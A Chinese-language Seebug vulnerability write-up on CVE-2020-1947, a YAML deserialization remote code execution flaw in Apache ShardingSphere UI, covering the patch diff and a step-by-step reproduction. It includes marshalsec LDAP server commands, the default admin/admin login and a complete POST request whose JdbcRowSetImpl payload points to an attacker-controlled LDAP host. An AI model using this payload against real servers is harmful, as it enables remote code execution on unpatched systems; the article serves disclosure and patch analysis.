**作者：Ja0k@SecurityCN**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

## 一、事件背景

近日，Apache官方发布了ShardingSphere 新版本修复了一个YAML解析导致的远程代码执行漏洞（CVE-2020-1947）。 Apache
ShardingSphere是一套开源的分布式数据库中间件解决方案组成的生态圈，它由Sharding-JDBC、Sharding-Proxy和Sharding-Sidecar（规划中）这3款相互独立，却又能够混合部署配合使用的产品组成。它们均提供标准化的数据分片、分布式事务和数据库治理功能，可适用于如Java同构、异构语言、云原生等各种多样化的应用场景。

## 二、漏洞信息

漏洞名称 | Apache ShardingSphere UI YAML解析远程代码执行漏洞  
---|---  
CVE编号 | CVE-2020-1947  
影响范围 | Apache ShardingSphere UI <= 4.0.1  
威胁等级 | 高危  
公开时间 | 2020年3月10日  
  
## 三、漏洞分析

### 补丁对比

<https://github.com/apache/incubator-shardingsphere/releases> 通过4.0.1
版本的change-log 中的Enhancement 可以看到添加了一个类过滤器构造函数以限制来自YAML的非法类。

![](https://images.seebug.org/content/images/2020/03/041dea60-0064-4e83-99ec-b3aadc8a988f.png-w331s)

incubator-shardingsphere-4.0.1\sharding-core\sharding-core-common\src\main\java\org\apache\shardingsphere\core\yaml\engine\ClassFilterConstructor.java

![](https://images.seebug.org/content/images/2020/03/ef5417f7-b40e-4044-8ed3-6e04ed39a64a.png-w331s)

    
    
    public final class ClassFilterConstructor extends Constructor {
    
        private final Collection<Class<?>> acceptClasses;
    
        @Override
        protected Class<?> getClassForName(final String name) throws ClassNotFoundException {
            for (Class<? extends Object> each : acceptClasses) {
                if (name.equals(each.getName())) {
                    return super.getClassForName(name);
                }
            }
            throw new IllegalArgumentException(String.format("Class is not accepted: %s", name));
        }
    }

添加了一个白名单类acceptClasses列表用for each进行遍历，其他危险的类调用将会被拒绝，如本次Poc中的调用类JdbcRowSetImpl

![](https://images.seebug.org/content/images/2020/03/1a38b330-791f-4605-95d5-7e3c396245fd.png-w331s)

再看4.0.0 版本中
src/main/java/org/apache/shardingsphere/ui/util/ConfigurationYamlConverter.java
直接使用unmarshal方法对输入的YAML直接进行解析，没有做校验。那么就可以参考Fastjson的反序列化漏洞，通过com.sun.rowset.JdbcRowSetImpl类远程调用来进行JNDI注入。

![](https://images.seebug.org/content/images/2020/03/7dcfdc33-17bb-4b4b-ab0e-f7814e12c24c.png-w331s)

![](https://images.seebug.org/content/images/2020/03/859c5136-d887-4535-8381-c617bc47d479.png-w331s)

漏洞触发点就是YAML

### 四、漏洞复现

#### 搭建 Apache ShardingSphere UI环境

1.github下载的 Apache ShardingSphere UI 需要编译之后使用

    
    
    编译过程
    #wget -c https://github.com/apache/incubator-shardingsphere/archive/4.0.0.tar.gz
    #cd incubator-shardingsphere/shrding-ui/
    #mvn clean package -Prelease
    Get the package in shardingsphere-ui/shardingsphere-ui-distribution/shardingsphere-ui-bin-distribution/target/apache-shardingsphere-incubating-${latest.release.version}-shardingsphere-ui-bin.tar.gz

2.也可以在官网下载Linux版本二进制程序包 （建议大家用此方法）
<https://shardingsphere.apache.org/document/current/cn/downloads/>

![](https://images.seebug.org/content/images/2020/03/4fceb17b-20ba-45f7-b40b-3db25c3a48f4.png-w331s)

下载地址：  
<https://mirrors.tuna.tsinghua.edu.cn/apache/incubator/shardingsphere/4.0.0/apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz>  
解压:  
tar -xf apache-shardingsphere-incubating-4.0.0-sharding-ui-bin.tar.gz

sharding-ui是一个标准的springboot程序，可以通过conf/application.properties配置相关信息

![](https://images.seebug.org/content/images/2020/03/d16af5a0-b9bf-4062-9fce-6150c681d76b.png-w331s)

可以看到默认监听 8088 端口，默认管理员口令为 admin/admin （生产环境建议修改密码） 进入程序目录运行启动程序 bin/start.sh

![](https://images.seebug.org/content/images/2020/03/d9ead2a1-2aa9-460c-99c8-221812974632.png-w331s)

通过浏览器访问8088端口

![](https://images.seebug.org/content/images/2020/03/87e43720-8e47-4dbb-b8a9-02816fb2b7d3.png-w331s)

使用默认口令即可登录成功

![](https://images.seebug.org/content/images/2020/03/b358b470-b8f6-44f3-8bc5-f18d65de4af6.png-w331s)

添加1个注册中心 Zookeeper
![](ApacheShardingSphereUIYAMLRCE分析/2020-03-12-16-42-40.png)

![](https://images.seebug.org/content/images/2020/03/08fcfa73-a00e-458a-bcc0-e8964d6cb1e7.png-w331s)

**注意：这里不一定需要搭建Zookeeper，只有填入一个地址即可（不能填写127.0.0.1，否则报错）**
如果想搭建可以参考教程<https://www.jianshu.com/p/a5fda39f20d0>

#### 使用Poc进行验证

1.构造Exp并编译 ExportObject.java

![](https://images.seebug.org/content/images/2020/03/1157c0dc-9eba-41c2-a771-0ddeb8338617.png-w331s)

    
    
    将ExportObject.java编译
    javac ExportObject.java

2.启动HTTPserver

    
    
    在ExportObject.class当前目录打开终端中执行
    python -m SimpleHTTPServer 

![](ApacheShardingSphereUIYAMLRCE分析/2020-03-12-17-06-59.png) 启动Httpserver，地址为
<http://192.168.80.1:8000>

3.利用marshalsec工具启用ldap或rmi

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.80.1:8000/#ExportObject

![](ApacheShardingSphereUIYAMLRCE分析/2020-03-12-17-07-49.png)

4.发送Poc 触发YAML 完整请求

    
    
    POST /api/schema HTTP/1.1
    Host: 192.168.80.138:8088
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: application/json, text/plain, */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Access-Token: eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsImJhc2U2NCI6eyJlbmNvZGVUYWJsZSI6WzY1LDY2LDY3LDY4LDY5LDcwLDcxLDcyLDczLDc0LDc1LDc2LDc3LDc4LDc5LDgwLDgxLDgyLDgzLDg0LDg1LDg2LDg3LDg4LDg5LDkwLDk3LDk4LDk5LDEwMCwxMDEsMTAyLDEwMywxMDQsMTA1LDEwNiwxMDcsMTA4LDEwOSwxMTAsMTExLDExMiwxMTMsMTE0LDExNSwxMTYsMTE3LDExOCwxMTksMTIwLDEyMSwxMjIsNDgsNDksNTAsNTEsNTIsNTMsNTQsNTUsNTYsNTcsNDMsNDddLCJkZWNvZGVUYWJsZSI6Wy0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDYyLC0xLDYyLC0xLDYzLDUyLDUzLDU0LDU1LDU2LDU3LDU4LDU5LDYwLDYxLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDAsMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsLTEsLTEsLTEsLTEsNjMsLTEsMjYsMjcsMjgsMjksMzAsMzEsMzIsMzMsMzQsMzUsMzYsMzcsMzgsMzksNDAsNDEsNDIsNDMsNDQsNDUsNDYsNDcsNDgsNDksNTAsNTFdLCJkZWNvZGVTaXplIjozLCJlbmNvZGVTaXplIjo0LCJQQUQiOjYxLCJwYWQiOjYxLCJ1bmVuY29kZWRCbG9ja1NpemUiOjMsImVuY29kZWRCbG9ja1NpemUiOjQsImxpbmVMZW5ndGgiOjAsImNodW5rU2VwYXJhdG9yTGVuZ3RoIjoyfSwiZ3NvbiI6eyJjYWxscyI6eyJ0aHJlYWRMb2NhbEhhc2hDb2RlIjoxMzk4MDMyNzAxfSwidHlwZVRva2VuQ2FjaGUiOnsiaW50Ijp7fSwiamF2YS5sYW5nLkJvb2xlYW4iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5QcmVKYXZhOVJlZmxlY3Rpb25BY2Nlc3NvciI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlJlZmxlY3RpdmVUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Kc29uQWRhcHRlckFubm90YXRpb25UeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fSwib3JnLmFwYWNoZS5jb21tb25zLmNvZGVjLmJpbmFyeS5CYXNlNjQiOnt9LCJqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyXHUwMDNjP1x1MDAzZVx1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlR5cGVBZGFwdGVycyQzNSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5FeGNsdWRlciI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLkRhdGVUeXBlQWRhcHRlciQxIjp7fSwiY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyXHUwMDNjP1x1MDAzZSI6e30sImJvb2xlYW4iOnt9LCJkb3VibGUiOnt9LCJqYXZhLnV0aWwuTGlzdFx1MDAzY2NvbS5nb29nbGUuZ3Nvbi5UeXBlQWRhcHRlckZhY3RvcnlcdTAwM2UiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzAiOnt9LCJqYXZhLmxhbmcuU3RyaW5nIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDI2Ijp7fSwiY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5GaWVsZE5hbWluZ1N0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMyIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVGltZVR5cGVBZGFwdGVyJDEiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuQ29uc3RydWN0b3JDb25zdHJ1Y3RvciI6e30sImphdmEudXRpbC5NYXBcdTAwM2NqYXZhLmxhbmcucmVmbGVjdC5UeXBlLCBjb20uZ29vZ2xlLmdzb24uSW5zdGFuY2VDcmVhdG9yXHUwMDNjP1x1MDAzZVx1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlNxbERhdGVUeXBlQWRhcHRlciQxIjp7fSwiY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5Ijp7fSwiamF2YS5sYW5nLkJ5dGUiOnt9LCJqYXZhLmxhbmcuQ2xhc3NcdTAwM2M/XHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLkluc3RhbmNlQ3JlYXRvclx1MDAzYz9cdTAwM2UiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwucmVmbGVjdC5SZWZsZWN0aW9uQWNjZXNzb3IiOnt9LCJjb20uZ29vZ2xlLmdzb24uRmllbGROYW1pbmdQb2xpY3kkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5Hc29uIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuQXJyYXlUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLnJlZmxlY3QuVHlwZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlR5cGVBZGFwdGVycyQzMyI6e30sIm9yZy5hcGFjaGUuc2hhcmRpbmdzcGhlcmUudWkuc2VjdXJpdHkuVXNlckF1dGhlbnRpY2F0aW9uU2VydmljZSI6e30sImJ5dGVbXSI6e30sImJ5dGUiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5PYmplY3RUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLkludGVnZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5NYXBUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Db2xsZWN0aW9uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fSwiY29tLmdvb2dsZS5nc29uLkxvbmdTZXJpYWxpemF0aW9uUG9saWN5JDEiOnt9LCJjb20uZ29vZ2xlLmdzb24uTG9uZ1NlcmlhbGl6YXRpb25Qb2xpY3kiOnt9LCJqYXZhLmxhbmcuVGhyZWFkTG9jYWxcdTAwM2NqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLkdzb24kRnV0dXJlVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDM0Ijp7fSwiamF2YS51dGlsLkxpc3RcdTAwM2Njb20uZ29vZ2xlLmdzb24uRXhjbHVzaW9uU3RyYXRlZ3lcdTAwM2UiOnt9LCJqYXZhLmxhbmcuRG91YmxlIjp7fX0sImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiZmFjdG9yaWVzIjpbbnVsbCxudWxsLHsidmVyc2lvbiI6LTEuMCwibW9kaWZpZXJzIjoxMzYsInNlcmlhbGl6ZUlubmVyQ2xhc3NlcyI6dHJ1ZSwicmVxdWlyZUV4cG9zZSI6ZmFsc2UsInNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXSwiZGVzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W119LG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0seyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319LCJjb21wbGV4TWFwS2V5U2VyaWFsaXphdGlvbiI6ZmFsc2V9LHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0sbnVsbCx7ImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImZpZWxkTmFtaW5nUG9saWN5IjoiSURFTlRJVFkiLCJleGNsdWRlciI6eyJ2ZXJzaW9uIjotMS4wLCJtb2RpZmllcnMiOjEzNiwic2VyaWFsaXplSW5uZXJDbGFzc2VzIjp0cnVlLCJyZXF1aXJlRXhwb3NlIjpmYWxzZSwic2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdLCJkZXNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiYWNjZXNzb3IiOnt9fV0sImV4Y2x1ZGVyIjp7InZlcnNpb24iOi0xLjAsIm1vZGlmaWVycyI6MTM2LCJzZXJpYWxpemVJbm5lckNsYXNzZXMiOnRydWUsInJlcXVpcmVFeHBvc2UiOmZhbHNlLCJzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W10sImRlc2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdfSwiZmllbGROYW1pbmdTdHJhdGVneSI6IklERU5USVRZIiwiaW5zdGFuY2VDcmVhdG9ycyI6e30sInNlcmlhbGl6ZU51bGxzIjpmYWxzZSwiY29tcGxleE1hcEtleVNlcmlhbGl6YXRpb24iOmZhbHNlLCJnZW5lcmF0ZU5vbkV4ZWN1dGFibGVKc29uIjpmYWxzZSwiaHRtbFNhZmUiOnRydWUsInByZXR0eVByaW50aW5nIjpmYWxzZSwibGVuaWVudCI6ZmFsc2UsInNlcmlhbGl6ZVNwZWNpYWxGbG9hdGluZ1BvaW50VmFsdWVzIjpmYWxzZSwiZGF0ZVN0eWxlIjoyLCJ0aW1lU3R5bGUiOjIsImxvbmdTZXJpYWxpemF0aW9uUG9saWN5IjoiREVGQVVMVCIsImJ1aWxkZXJGYWN0b3JpZXMiOltdLCJidWlsZGVySGllcmFyY2h5RmFjdG9yaWVzIjpbXX19
    Content-Type: application/json;charset=utf-8
    Referer: http://192.168.80.138:8088/
    Connection: close
    Content-Length: 598
    
    {
      "name": "CVE-2020-1947",
      "ruleConfiguration": "  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5",
      "dataSourceConfiguration": "!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://192.168.80.1:1389/ExportObject\n  autoCommit: true"
    }

**注意：Access-Token 要改为当前登录shardingsphere UI的token**

![](https://images.seebug.org/content/images/2020/03/a1d3c2f7-dcca-4c2a-ac51-6ca5dcbc149f.png-w331s)

查看服务器发现/tmp/CVE-2020-1947 文件

![](https://images.seebug.org/content/images/2020/03/d0d4f4f5-e35f-4f34-b3aa-a4c24e586823.png-w331s)

touch命令执行成功

### 四、修复建议

官方已经发布新版本 <https://github.com/apache/incubator-shardingsphere/releases>

**参考链接**

  1. <https://github.com/SecurityCN/Vulnerability-analysis/tree/master/CVE-2020-1947>

  2. <https://github.com/apache/incubator-shardingsphere/releases>

  3. <https://github.com/Imanfeng/CVE-2020-1947>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1150/>

